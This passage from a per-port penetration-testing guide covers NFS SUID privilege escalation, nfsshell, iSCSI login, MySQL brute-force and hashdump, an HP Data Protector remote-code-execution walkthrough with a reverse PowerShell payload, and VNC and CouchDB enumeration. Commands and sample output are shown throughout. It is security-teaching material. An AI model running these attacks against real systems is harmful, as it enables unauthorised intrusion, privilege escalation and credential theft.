<p>Further, if we are unprivileged user on that Linux box, we can just execute this binary to become root.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">www-data@xxxxxhostcus:/tmp$ </span>./pwnme
<span class="go">./pwnme</span>
<span class="gp"># </span>id
<span class="go">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
</pre></div>
</div>
<section id="nfsshell">
<h3>nfsshell<a class="headerlink" href="#nfsshell" title="Link to this heading"></a></h3>
<p>As your uid and gid must be equivalent to the user, we are emulating to the nfs-share, we can use <a class="reference external" href="https://github.com/NetDirect/nfsshell">nfsshell</a>  NFS shell that provides user level access to an NFS server, over UDP or TCP, supports source routing and “secure” (privileged port) mounts. It’s a useful tool to manually check (or show) security problems after a security scanner has detected them. Pentest Partners have published a blog on <a class="reference external" href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p>
<section id="using-nfsshell">
<h4>Using nfsshell<a class="headerlink" href="#using-nfsshell" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Selecting the target, can either be the hostname (assuming you have name servers available to resolve against), or the IP address:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">host &lt;host&gt; - set remote host name</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Show which shares the target has available:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">export - show all exported file systems</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Try and mount them:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mount [-upTU] [-P port] &lt;path&gt; – mount file system</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Nfsshell is useful for accessing NFS shares without having to create users with the same UID/GID pair as the target exported filesystem. The following commands within nfsshell set the UID and GID:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">uid [&lt;uid&gt; [&lt;secret-key&gt;]] – set remote user id</span>
<span class="go">gid [&lt;gid&gt;] – set remote group id</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Other important commands</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">chmod &lt;mode&gt; &lt;file&gt; - change mode</span>
<span class="go">chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner</span>
<span class="go">put &lt;local-file&gt; [&lt;remote-file&gt;] - put file</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
</section>
<section id="port-3260-iscsi">
<span id="iscsi-port-3260"></span><h2>Port 3260 - ISCSI<a class="headerlink" href="#port-3260-iscsi" title="Link to this heading"></a></h2>
<p>Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. A good article is <a class="reference external" href="https://pig.made-it.com/iSCSI.html">SCSI over IP</a></p>
<section id="id56">
<h3>Nmap<a class="headerlink" href="#id56" title="Link to this heading"></a></h3>
<section id="iscsi-info">
<h4>iscsi-info<a class="headerlink" href="#iscsi-info" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/iscsi-info.html">iscsi-info.nse</a>: Collects and displays information from remote iSCSI targets.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sV -p 3260 192.168.xx.xx --script=iscsi-info</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-05-04 14:50 IST</span>
<span class="go">Nmap scan report for 192.168.xx.xx</span>
<span class="go">Host is up (0.00064s latency).</span>
<span class="go">PORT     STATE SERVICE VERSION</span>
<span class="go">3260/tcp open  iscsi?</span>
<span class="go">| iscsi-info:</span>
<span class="go">|   iqn.1992-05.com.emc:fl1001433000190000-3-vnxe:</span>
<span class="go">|     Address: 192.168.xx.xx:3260,1</span>
<span class="go">|_    Authentication: NOT required</span>
<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 138.09 seconds</span>
</pre></div>
</div>
</section>
</section>
<section id="id57">
<h3>Other<a class="headerlink" href="#id57" title="Link to this heading"></a></h3>
<section id="iscsiadm">
<h4>iscsiadm<a class="headerlink" href="#iscsiadm" title="Link to this heading"></a></h4>
<p>Hacking Team DIY shows to run</p>
<p>We can discover the target IP address by using the below command</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">iscsiadm -m discovery -t sendtargets -p 192.168.xx.xx</span>
<span class="go">192.168.xx.xx:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe</span>
</pre></div>
</div>
<p>Login via</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">iscsiadm -m node --targetname=&quot;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&quot; -l -p 192.168.xx.xx --login -</span>
<span class="go">Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] (multiple)</span>
<span class="go">Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.</span>
</pre></div>
</div>
<p>Failed Result: When we login, ideally we should be able to see the location, however for some strange reason we didn’t got that here.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[43852.014179] scsi host6: iSCSI Initiator over TCP/IP</span>
<span class="go">[43852.306055] scsi 6:0:0:0: Direct-Access     EMC      Celerra          0002 PQ: 1 ANSI: 5</span>
<span class="go">[43852.323940] scsi 6:0:0:0: Attached scsi generic sg1 type 0</span>
</pre></div>
</div>
<p>Sucessful Result: If we see, the drive is attached to sdb1</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[125933.964768] scsi host10: iSCSI Initiator over TCP/IP</span>
<span class="go">[125934.259637] scsi 10:0:0:0: Direct-Access     LIO-ORG  FILEIO           v2.  PQ: 0 ANSI: 2</span>
<span class="go">[125934.259919] sd 10:0:0:0: Attached scsi generic sg1 type 0</span>
<span class="go">[125934.266155] sd 10:0:0:0: [sdb] 2097152001 512-byte logical blocks: (1.07 TB/1000 GiB)</span>
<span class="go">[125934.266794] sd 10:0:0:0: [sdb] Write Protect is off</span>
<span class="go">[125934.266801] sd 10:0:0:0: [sdb] Mode Sense: 2f 00 00 00</span>
<span class="go">[125934.268003] sd 10:0:0:0: [sdb] Write cache: disabled, read cache: enabled, doesn&#39;t support DPO or FUA</span>
<span class="go">[125934.275206]  sdb: sdb1</span>
<span class="go">[125934.279017] sd 10:0:0:0: [sdb] Attached SCSI dis</span>
</pre></div>
</div>
<p>We can logout using –logout</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">iscsiadm -m node --targetname=&quot;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&quot; -p 192.168.xx.xx --logout</span>
<span class="go">Logging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260]</span>
<span class="go">Logout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.</span>
</pre></div>
</div>
<p>We can find more information about it by just using without any –login/–logout parameter</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">iscsiadm -m node --targetname=&quot;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&quot; -p 192.168.xx.xx</span>
<span class="gp"># </span>BEGIN<span class="w"> </span>RECORD<span class="w"> </span><span class="m">2</span>.0-873
<span class="go">node.name = iqn.1992-05.com.emc:fl1001433000190000-3-vnxe</span>
<span class="go">node.tpgt = 1</span>
<span class="go">node.startup = manual</span>
<span class="go">node.leading_login = No</span>
<span class="go">iface.hwaddress = &lt;empty&gt;</span>
<span class="go">iface.ipaddress = &lt;empty&gt;</span>
<span class="go">iface.iscsi_ifacename = default</span>
<span class="go">iface.net_ifacename = &lt;empty&gt;</span>
<span class="go">iface.transport_name = tcp</span>
<span class="go">iface.initiatorname = &lt;empty&gt;</span>
<span class="go">iface.bootproto = &lt;empty&gt;</span>
<span class="go">iface.subnet_mask = &lt;empty&gt;</span>
<span class="go">iface.gateway = &lt;empty&gt;</span>
<span class="go">iface.ipv6_autocfg = &lt;empty&gt;</span>
<span class="go">iface.linklocal_autocfg = &lt;empty&gt;</span>
<span class="go">iface.router_autocfg = &lt;empty&gt;</span>
<span class="go">iface.ipv6_linklocal = &lt;empty&gt;</span>
<span class="go">iface.ipv6_router = &lt;empty&gt;</span>
<span class="go">iface.state = &lt;empty&gt;</span>
<span class="go">iface.vlan_id = 0</span>
<span class="go">iface.vlan_priority = 0</span>
<span class="go">iface.vlan_state = &lt;empty&gt;</span>
<span class="go">iface.iface_num = 0</span>
<span class="go">iface.mtu = 0</span>
<span class="go">iface.port = 0</span>
<span class="go">node.discovery_address = 192.168.xx.xx</span>
<span class="go">node.discovery_port = 3260</span>
<span class="go">node.discovery_type = send_targets</span>
<span class="go">node.session.initial_cmdsn = 0</span>
<span class="go">node.session.initial_login_retry_max = 8</span>
<span class="go">node.session.xmit_thread_priority = -20</span>
<span class="go">node.session.cmds_max = 128</span>
<span class="go">node.session.queue_depth = 32</span>
<span class="go">node.session.nr_sessions = 1</span>
<span class="go">node.session.auth.authmethod = None</span>
<span class="go">node.session.auth.username = &lt;empty&gt;</span>
<span class="go">node.session.auth.password = &lt;empty&gt;</span>
<span class="go">node.session.auth.username_in = &lt;empty&gt;</span>
<span class="go">node.session.auth.password_in = &lt;empty&gt;</span>
<span class="go">node.session.timeo.replacement_timeout = 120</span>
<span class="go">node.session.err_timeo.abort_timeout = 15</span>
<span class="go">node.session.err_timeo.lu_reset_timeout = 30</span>
<span class="go">node.session.err_timeo.tgt_reset_timeout = 30</span>
<span class="go">node.session.err_timeo.host_reset_timeout = 60</span>
<span class="go">node.session.iscsi.FastAbort = Yes</span>
<span class="go">node.session.iscsi.InitialR2T = No</span>
<span class="go">node.session.iscsi.ImmediateData = Yes</span>
<span class="go">node.session.iscsi.FirstBurstLength = 262144</span>
<span class="go">node.session.iscsi.MaxBurstLength = 16776192</span>
<span class="go">node.session.iscsi.DefaultTime2Retain = 0</span>
<span class="go">node.session.iscsi.DefaultTime2Wait = 2</span>
<span class="go">node.session.iscsi.MaxConnections = 1</span>
<span class="go">node.session.iscsi.MaxOutstandingR2T = 1</span>
<span class="go">node.session.iscsi.ERL = 0</span>
<span class="go">node.conn[0].address = 192.168.xx.xx</span>
<span class="go">node.conn[0].port = 3260</span>
<span class="go">node.conn[0].startup = manual</span>
<span class="go">node.conn[0].tcp.window_size = 524288</span>
<span class="go">node.conn[0].tcp.type_of_service = 0</span>
<span class="go">node.conn[0].timeo.logout_timeout = 15</span>
<span class="go">node.conn[0].timeo.login_timeout = 15</span>
<span class="go">node.conn[0].timeo.auth_timeout = 45</span>
<span class="go">node.conn[0].timeo.noop_out_interval = 5</span>
<span class="go">node.conn[0].timeo.noop_out_timeout = 5</span>
<span class="go">node.conn[0].iscsi.MaxXmitDataSegmentLength = 0</span>
<span class="go">node.conn[0].iscsi.MaxRecvDataSegmentLength = 262144</span>
<span class="go">node.conn[0].iscsi.HeaderDigest = None</span>
<span class="go">node.conn[0].iscsi.DataDigest = None</span>
<span class="go">node.conn[0].iscsi.IFMarker = No</span>
<span class="go">node.conn[0].iscsi.OFMarker = No</span>
<span class="gp"># </span>END<span class="w"> </span>RECORD
</pre></div>
</div>
<p>We have created a script to automate login/ logout process available at <a class="reference external" href="https://github.com/bitvijays/Pentest-Scripts/tree/master/Vulnerability_Analysis/isciadm">iscsiadm</a></p>
</section>
</section>
</section>
<section id="port-3299-sap-router">
<span id="sap-router-port-3299"></span><h2>Port 3299 - SAP Router<a class="headerlink" href="#port-3299-sap-router" title="Link to this heading"></a></h2>
<p>morisson has written a blog on <a class="reference external" href="https://community.rapid7.com/community/metasploit/blog/2014/01/09/piercing-saprouter-with-metasploit">Piercing SAProuter with Metasploit</a></p>
</section>
<section id="port-3306-mysql">
<span id="mysql-port-3306"></span><h2>Port 3306 - MySQL<a class="headerlink" href="#port-3306-mysql" title="Link to this heading"></a></h2>
<section id="id59">
<h3>Metasploit<a class="headerlink" href="#id59" title="Link to this heading"></a></h3>
<section id="mysql-server-version-enumeration">
<h4>MySQL Server Version Enumeration<a class="headerlink" href="#mysql-server-version-enumeration" title="Link to this heading"></a></h4>
<p>Enumerates the version of MySQL servers</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/mysql/mysql_version</span>
<span class="go">services -p 3306 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.7.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &#39;10.10.3.71&#39; is not allowed to connect to this MySQL server</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)</span>
<span class="go">[*] Scanned  5 of 44 hosts (11% complete)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.5.35-0ubuntu0.12.04.2 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.0.95 (protocol 10)</span>
<span class="go">[*] Scanned  9 of 44 hosts (20% complete)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &#39;10.10.3.71&#39; is not allowed to connect to this MySQL server</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &#39;10.10.3.71&#39; is not allowed to connect to this MariaDB server</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &#39;10.10.3.71&#39; is not allowed to connect to this MySQL server</span>
<span class="go">[*] Scanned 14 of 44 hosts (31% complete)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &#39;10.10.3.71&#39; is not allowed to connect to this MySQL server</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &#39;10.10.3.71&#39; is not allowed to connect to this MySQL server</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)</span>
<span class="go">[*] Scanned 18 of 44 hosts (40% complete)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.6.17 (protocol 10)</span>
<span class="go">[*] 10.10.xx.xx:3306 is running MySQL 5.1.50-community (protocol 10)</span>
</pre></div>
</div>
</section>
<section id="mysql-login-utility">
<h4>MySQL Login Utility<a class="headerlink" href="#mysql-login-utility" title="Link to this heading"></a></h4>
<p>Validate login or bruteforce logins. This module simply queries the MySQL instance for a specific user/pass (default is root with blank)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/mysql/mysql_login</span>
<span class="go">services -p 3306 -u -R</span>
<span class="go">set username root</span>
<span class="go">set password example@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50</span>
<span class="go">[+] 10.10.xx.xx:3306 MYSQL - Success: &#39;root:example@123&#39;</span>
<span class="go">[*] Scanned 22 of 44 hosts (50% complete)</span>
<span class="go">[*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50</span>
<span class="go">[+] 10.10.xx.xx:3306 MYSQL - Success: &#39;root:example@123&#39;</span>
<span class="go">[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.</span>
<span class="go">[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.</span>
<span class="go">[*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.6.15</span>
<span class="go">[-] 10.10.xx.xx:3306 MYSQL - LOGIN FAILED: root:example@123 (Incorrect:</span>
</pre></div>
</div>
<p>Once we have to username passsword for the root we can use</p>
</section>
<section id="mysql-password-hashdump">
<h4>MYSQL Password Hashdump<a class="headerlink" href="#mysql-password-hashdump" title="Link to this heading"></a></h4>
<p>to extract the usernames and encrypted password hashes from a MySQL server.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/mysql/mysql_hashdump</span>
<span class="go">creds -p 3306 -t password -u root -R</span>
<span class="go">set username root</span>
<span class="go">set password example@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[-] MySQL Error: RbMysql::HandshakeError Bad handshake</span>
<span class="go">[-] There was an error reading the MySQL User Table</span>
<span class="go">[*] Scanned 4 of 6 hosts (66% complete)</span>
<span class="go">[+] Saving HashString as Loot: root:6FE073B02F77230C092415032F0FF0951FXXXXXX</span>
<span class="go">[+] Saving HashString as Loot: wordpress:A31B8F449706C32558ABC788DDABF62DCCXXXXXX</span>
<span class="go">[+] Saving HashString as Loot: root:6FE073B02F77230C092415032F0FF0951FXXXXXX</span>
<span class="go">[+] Scanned 5 of 6 hosts (83% complete)</span>
<span class="go">[+] Saving HashString as Loot: newsgroupdbo:6FE073B02F77230C092415032F0FF0951FXXXXXX</span>
<span class="go">[+] Saving HashString as Loot: intiadda:6FE073B02F77230C092415032F0FF0951XXXXXX</span>
<span class="go">[+] Saving HashString as Loot: newsgroupdbo:6FE073B02F77230C092415032F0FF0951FXXXXXX</span>
</pre></div>
</div>
</section>
</section>
<section id="id60">
<h3>Other<a class="headerlink" href="#id60" title="Link to this heading"></a></h3>
<section id="mysql">
<h4>mysql<a class="headerlink" href="#mysql" title="Link to this heading"></a></h4>
<p>Once we have the username and password, we can use <strong>mysql utility</strong> to login in to the server.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mysql -u root -p -h 10.10.xx.xx</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="id61">
<p class="admonition-title">Todo</p>
<p>Explore UDF functionality and vulnerability!!</p>
</div>
</section>
</section>
</section>
<section id="port-5432-postgresql">
<span id="postgresql-port-5432"></span><h2>Port 5432 - Postgresql<a class="headerlink" href="#port-5432-postgresql" title="Link to this heading"></a></h2>
<section id="id62">
<h3>Metasploit<a class="headerlink" href="#id62" title="Link to this heading"></a></h3>
<section id="postgresql-version-probe">
<h4>PostgreSQL Version Probe<a class="headerlink" href="#postgresql-version-probe" title="Link to this heading"></a></h4>
<p>Enumerates the version of PostgreSQL servers.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/postgres/postgres_version</span>
</pre></div>
</div>
</section>
<section id="postgresql-login-utility">
<h4>PostgreSQL Login Utility<a class="headerlink" href="#postgresql-login-utility" title="Link to this heading"></a></h4>
<p>Module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/postgres/postgres_login</span>
</pre></div>
</div>
</section>
<section id="postgresql-database-name-command-line-flag-injection">
<h4>PostgreSQL Database Name Command Line Flag Injection<a class="headerlink" href="#postgresql-database-name-command-line-flag-injection" title="Link to this heading"></a></h4>
<p>Identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to command-line flag injection through CVE-2013-1899. This can lead to denial of service, privilege escalation, or even arbitrary code execution</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/postgres/postgres_dbname_flag_injection</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-5555-hpdataprotector-rce">
<span id="hpdataprotector-rce-port-5555"></span><h2>Port 5555 - HPDataProtector RCE<a class="headerlink" href="#port-5555-hpdataprotector-rce" title="Link to this heading"></a></h2>
<p>HPData proctector service was running on port no. 5555.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf &gt; services -p 5555</span>

<span class="go">Services</span>
<span class="go">========</span>
<span class="go">host          port  proto  name      state  info</span>
<span class="go">----          ----  -----  ----      -----  ----</span>
<span class="go">10.x.x.x      5555  tcp    omniback  open   HP OpenView Omniback/Data Protector</span>
<span class="go">10.x.x.x      5555  tcp    omniinet  open   HP Data Protector 7.00 build 105</span>
<span class="go">10.x.x.x      5555  tcp    freeciv   open</span>
<span class="go">10.x.x.x      5555  tcp    omniinet  open   HP Data Protector 7.00 build 105</span>
<span class="go">10.x.x.x      5555  tcp    omniback  open   HP Data Protector A.07.00 internal build 105; built on Wednesday, October 16, 2013, 10:55 PM</span>
</pre></div>
</div>
<p>Metasploit framework comes with an exploit for  exploiting this vulnerability. which can be searched by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf &gt; search integutil</span>

<span class="go">Matching Modules</span>
<span class="go">================</span>

<span class="go"> Name                                                 Disclosure Date  Rank   Description</span>
<span class="go"> ----                                                 ---------------  ----   -----------</span>
<span class="go"> exploit/multi/misc/hp_data_protector_exec_integutil  2014-10-02       great  HP Data Protector EXEC_INTEGUTIL Remote Code ExecutionNOw</span>
</pre></div>
</div>
<p>Now this can be used by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf &gt; use exploit/multi/misc/hp_data_protector_exec_integutil</span>
<span class="go">msf exploit(hp_data_protector_exec_integutil) &gt; show options</span>

<span class="go">Module options (exploit/multi/misc/hp_data_protector_exec_integutil):</span>

<span class="go">Name   Current Setting  Required  Description</span>
<span class="go">----   ---------------  --------  -----------</span>
<span class="go">RHOST                   yes       The target address</span>
<span class="go">RPORT  5555             yes       The target port (TCP)</span>

<span class="go">Exploit target:</span>
<span class="go">Id  Name</span>
<span class="go">--  ----</span>
<span class="go">0   Automatic</span>
</pre></div>
</div>
<p>Select the appropriate target by using</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf exploit(hp_data_protector_exec_integutil) &gt; show targets</span>

<span class="go">Exploit targets:</span>

<span class="go">Id  Name</span>
<span class="go">--  ----</span>
<span class="go">0   Automatic</span>
<span class="go">1   Linux 64 bits / HP Data Protector 9</span>
<span class="go">2   Windows 64 bits / HP Data Protector 9</span>

<span class="go">msf exploit(hp_data_protector_exec_integutil) &gt; set target 2    - for windows environment.</span>
</pre></div>
</div>
<p>set the appropriate RHOST and payloads by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf exploit(hp_data_protector_exec_integutil) &gt; set RHOST 10.1.1.1</span>
<span class="go">RHOST =&gt; 10.1.1.1</span>
<span class="go">msf exploit(hp_data_protector_exec_integutil) &gt; show payloads</span>

<span class="go">Compatible Payloads</span>
<span class="go">===================</span>

<span class="go">Name                            Disclosure Date  Rank    Description</span>
<span class="go">----                            ---------------  ----    -----------</span>
<span class="go">cmd/windows/reverse_powershell                   normal  Windows Command Shell, Reverse TCP (via Powershell)</span>
</pre></div>
</div>
<p>set all the necessary options and run. After this we can use Empire stagerlauncher or web_delivery to a get a meterpreter shell on our attacking machine.</p>
<p>Before metasploit module was present people from OpenSecurity Research were able to exploit it by sniffing the data Nessus Plugin sent. More details at <a class="reference external" href="http://blog.opensecurityresearch.com/2012/08/manually-exploiting-hp-data-protector.html">Manually Exploiting HP Data Protector</a></p>
</section>
<section id="port-5900-vnc">
<span id="vnc-port-5900"></span><h2>Port 5900 - VNC<a class="headerlink" href="#port-5900-vnc" title="Link to this heading"></a></h2>
<p>We always find openVNCs in an engagement.</p>
<section id="id63">
<h3>Metasploit<a class="headerlink" href="#id63" title="Link to this heading"></a></h3>
<section id="vnc-authentication-none-detection">
<h4>VNC Authentication None Detection<a class="headerlink" href="#vnc-authentication-none-detection" title="Link to this heading"></a></h4>
<p>Detect VNC servers that support the “None” authentication method.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/vnc/vnc_none_auth</span>
</pre></div>
</div>
</section>
<section id="vnc-authentication-scanner">
<h4>VNC Authentication Scanner<a class="headerlink" href="#vnc-authentication-scanner" title="Link to this heading"></a></h4>
<p>Module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/vnc/vnc_login</span>
</pre></div>
</div>
</section>
</section>
<section id="vnc-password">
<h3>VNC Password<a class="headerlink" href="#vnc-password" title="Link to this heading"></a></h3>
<p>~/.vnc/passwd is the default location where the VNC password is stored. The password is stored at this location when the vncserver starts for a first time. To update or change your VNC password you should use vncpasswd command.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo MYVNCPASSWORD | vncpasswd -f &gt; ~/.secret/passvnc</span>
<span class="go">Warning: password truncated to the length of 8.</span>

<span class="go">cat ~/.secret/passvnc</span>
<span class="go">kRS�ۭx8</span>
</pre></div>
</div>
<p>Now, if we have found the password file of the VNC on some CTF challenge or vulnerable machine, we can either decrypt it (to know the password) using <a class="reference external" href="https://github.com/jeroennijhof/vncpwd">VNC Password Decrypter</a> or use the password file while using vncviewer</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">vncviewer hostname-of-vnc-server -passwd ~/.secret/passvnc</span>

<span class="go">-passwd passwd-file File from which to get the password (as generated by the vncpasswd(1) program). This option affects only the standard VNC authentication.</span>
</pre></div>
</div>
</section>
</section>
<section id="port-5984-couchdb">
<span id="couchdb-port-5984"></span><h2>Port 5984 - CouchDB<a class="headerlink" href="#port-5984-couchdb" title="Link to this heading"></a></h2>
<section id="x11-port-6000">
<span id="id64"></span><h3>Other<a class="headerlink" href="#x11-port-6000" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://IP:5984/</span>
</pre></div>
</div>
<p>This issues a GET request to installed CouchDB instance.</p>
<p>The reply should look something like:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">{&quot;couchdb&quot;:&quot;Welcome&quot;,&quot;version&quot;:&quot;0.10.1&quot;}</span>
</pre></div>
</div>
<section id="database-list">
<h4>Database List<a class="headerlink" href="#database-list" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -X GET http://IP:5984/_all_dbs</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -X GET http://user:password@IP:5984/_all_dbs</span>
</pre></div>
</div>
<p>Response might be</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[&quot;baseball&quot;, &quot;plankton&quot;]</span>
</pre></div>
</div>
</section>
<section id="document-list">
<h4>Document List<a class="headerlink" href="#document-list" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -X GET http://IP:5984/{dbname}/_all_docs</span>
</pre></div>
</div>
<p>Response</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">{</span>
<span class="go">   &quot;offset&quot;: 0,</span>
<span class="go">   &quot;rows&quot;: [</span>
<span class="go">       {</span>
<span class="go">           &quot;id&quot;: &quot;16e458537602f5ef2a710089dffd9453&quot;,</span>
<span class="go">           &quot;key&quot;: &quot;16e458537602f5ef2a710089dffd9453&quot;,</span>
<span class="go">           &quot;value&quot;: {</span>
<span class="go">               &quot;rev&quot;: &quot;1-967a00dff5e02add41819138abb3284d&quot;</span>
<span class="go">           }</span>
<span class="go">       },</span>
<span class="go">       {</span>
<span class="go">           &quot;id&quot;: &quot;a4c51cdfa2069f3e905c431114001aff&quot;,</span>
<span class="go">           &quot;key&quot;: &quot;a4c51cdfa2069f3e905c431114001aff&quot;,</span>
<span class="go">           &quot;value&quot;: {</span>
<span class="go">               &quot;rev&quot;: &quot;1-967a00dff5e02add41819138abb3284d&quot;</span>
<span class="go">           }</span>
<span class="go">       },</span>
<span class="go">   ],</span>
<span class="go">   &quot;total_rows&quot;: 2</span>
<span class="go">}</span>
</pre></div>
</div>
</section>
<section id="read-value-document">
<h4>Read Value Document<a class="headerlink" href="#read-value-document" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -X GET http://IP:5984/{dbname}/{id}</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-6000-x11">
<h2>Port 6000 - X11<a class="headerlink" href="#port-6000-x11" title="Link to this heading"></a></h2>
<p>We do also find a lot of open X11 servers, we can use x11 to find the keyboard strokes and screenshots.</p>
<section id="id65">
<h3>Metasploit<a class="headerlink" href="#id65" title="Link to this heading"></a></h3>
<section id="x11-no-auth-scanner">
